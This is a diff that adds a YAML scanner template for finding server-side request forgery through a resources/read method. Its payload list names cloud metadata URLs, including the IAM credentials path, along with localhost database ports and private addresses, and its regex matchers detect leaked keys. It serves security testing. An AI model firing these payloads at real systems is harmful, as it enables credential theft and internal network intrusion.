@@ -1,0 +1,38 @@
+version: "1"
+name: "ssrf-via-resource"
+severity: high
+description: >
+  Inject internal network URLs into resource URI templates to detect
+  Server-Side Request Forgery (SSRF). A vulnerable server will attempt
+  to fetch the internal URL and return its content.
+  Targets: cloud metadata endpoints, localhost services, internal networks.
+
+requires:
+  capabilities:
+    - resources
+
+steps:
+  - id: probe_ssrf
+    type: mutate
+    method: resources/read
+    params:
+      uri: "${payload}"
+    payloads:
+      # AWS / GCP / Azure cloud metadata
+      - "http://169.254.169.254/latest/meta-data/"
+      - "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+      - "http://metadata.google.internal/computeMetadata/v1/"
+      - "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+      # Localhost services
+      - "http://localhost/"
+      - "http://127.0.0.1/"
+      - "http://localhost:8080/"
+      - "http://127.0.0.1:6379/"    # Redis
+      - "http://127.0.0.1:27017/"   # MongoDB
+      # Internal network probes
+      - "http://10.0.0.1/"
+      - "http://192.168.1.1/"
+    matchers:
+      - type: jsonrpc_success
+      - type: regex
+        pattern: "(ami-id|instance-id|AccessKeyId|computeMetadata|DOCTYPE html|redis_version|MongoDB)"
